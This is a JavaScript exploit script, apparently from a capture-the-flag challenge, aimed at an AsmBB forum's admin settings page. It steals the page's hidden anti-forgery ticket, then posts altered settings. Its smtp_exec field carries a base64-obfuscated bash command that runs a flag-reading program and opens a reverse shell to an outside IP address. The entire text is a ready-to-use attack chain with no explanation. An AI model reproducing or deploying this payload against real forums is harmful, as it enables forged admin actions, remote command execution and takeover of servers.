async function get_ticket() {
    return /<input type="hidden" name="ticket" value="([A-Z0-9]*)" >/.exec((await (await fetch('/!settings/')).text()))[1];
}

async function exp() {
    let t = await get_ticket();
    await fetch('/!settings/', {method:'POST',headers:{"Content-Type": "application/x-www-form-urlencoded"}, body: `forum_title=&forum_header=%3Ch1+style%3D%22font-weight%3A+800%22%3EAsmBB%3C%2Fh1%3E%0D%0A%3Cb+style%3D%22text-align%3A+center%22%3EPower%3Cbr%3E%0D%0A%3Csvg+version%3D%221.1%22+width%3D%2264%22+height%3D%2216%22+viewBox%3D%220+0+64+16%22+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0D%0A+%3Cpath+d%3D%22m0+6+8+10h34l-6-6+28-2-50-8+8+8z%22%2F%3E%0D%0A%3C%2Fsvg%3E%0D%0A%3C%2Fb%3E%0D%0A&description=&keywords=&tabselector=1&host=1.1.1.1&smtp_addr=&smtp_port=25&smtp_exec=%2Fbin%2Fbash+-c+%7Becho%2CL3JlYWRmbGFnID4mIC9kZXYvdGNwLzE4OC4xNjYuMjMyLjIwLzkwMDEgMD4mMSAg%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&smtp_user=asd&email_confirm=on&user_perm=1&user_perm=2&user_perm=4&user_perm=8&user_perm=16&user_perm=64&user_perm=256&user_perm=512&user_perm=1024&post_interval=0&post_interval_inc=0&max_post_length=0&anon_perm=1&anon_perm=2&activate_min_interval=0&default_lang=0&page_length=20&default_skin=Urban+Sunrise&default_mobile_skin=Urban+Sunrise&chat_enabled=on&markups=1&password=&ticket=${t}&save=Save`});
}

exp();